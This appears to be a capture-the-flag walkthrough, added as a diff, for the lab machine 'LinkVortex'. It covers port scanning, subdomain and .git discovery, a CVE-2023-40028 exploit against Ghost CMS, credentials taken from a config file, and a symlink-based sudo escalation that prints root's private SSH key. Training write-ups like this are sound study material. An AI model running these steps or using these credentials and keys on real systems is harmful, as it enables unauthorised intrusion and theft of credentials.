@@ -1,0 +1,93 @@
+LinkVortex 
+
+***************************
+nmap -p- --min-rate 1000 -T4 10.10.11.47
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-30 13:03 -05
+Warning: 10.10.11.47 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.11.47
+Host is up (0.19s latency).
+Not shown: 59847 closed tcp ports (reset), 5686 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+*******************************
+nmap -p22,80 -sCV -Pn -sS 10.10.11.47                  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-30 13:07 -05
+Nmap scan report for 10.10.11.47
+Host is up (0.13s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
+|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
+80/tcp open  http    Apache httpd
+|_http-title: Did not follow redirect to http://linkvortex.htb/
+|_http-server-header: Apache
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+*************************************
+http://linkvortex.htb/robots.txt
+
+gobuster vhost -u http://linkvortex.htb/ -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt --append-domain
+
+http://dev.linkvortex.htb
+
+**********************************
+dirsearch -u dev.linkvortex.htb -t 50 -i 200,301,404,505
+*****************************************
+python3 GitHack.py http://dev.linkvortex.htb/.git/
+***************************************
+ls                        
+authentication.test.js
+***************************************
+Version: 5.58.0 Ghost
+
+./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
+
+/var/lib/ghost/config.production.json # Ghost CMS Production Config
+
+},
+  "mail": {
+     "transport": "SMTP",
+     "options": {
+      "service": "Google",
+      "host": "linkvortex.htb",
+      "port": 587,
+      "auth": {
+        "user": "bob@linkvortex.htb",
+        "pass": "fibber-talented-worth"
+        }
+      }
+    }
+***************************
+
+ssh bob@ip-victim
+
+#escalada de privilegios.
+
+bob@linkvortex:~$ sudo -l
+
+bob@linkvortex:~$ export CHECK_CONTENT=true
+
+bob@linkvortex:~$ touch pa-que-pases-bien.png
+ob@linkvortex:~$ ln -sf /root/.ssh/id_rsa pa-que-pases-bien.png
+bob@linkvortex:~$ touch pa-que-pases-bien-2.png
+bob@linkvortex:~$ ln -sf /home/bob/pa-que-pases-bien.png pa-que-pases-bien-2.png
+bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh pa-que-pases-bien-2.png
+Link found [ pa-que-pases-bien-2.png ] , moving it to quarantine
+Content:
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
+q2egYfeMmgI9IoM0DdyDKS4vG+lIoWoJEfZf+cVwaZIzTZwKm7ECbF2Oy+u2SD+X7lG9A6
+V1xkmWhQWEvCiI22UjIoFkI0oOfDrm6ZQTyZF99AqBVcwGCjEA67eEKt/5oejN5YgL7Ipu
+6sKpMThUctYpWnzAc4yBN/mavhY7v5+TEV0FzPYZJ2spoeB3OGBcVNzSL41ctOiqGVZ7yX
+TQ6pQUZxR4zqueIZ7yHVsw5j0eeqlF8OvHT81wbS5ozJBgtjxySWrRkkKAcY11tkTln6NK
+CssRzP1r9kbmgHswClErHLL/CaBb/0
+****************************
+chmod 400 id_rsa
+ssh -i id_rsa root@10.10.11.47
+
+**********************************************
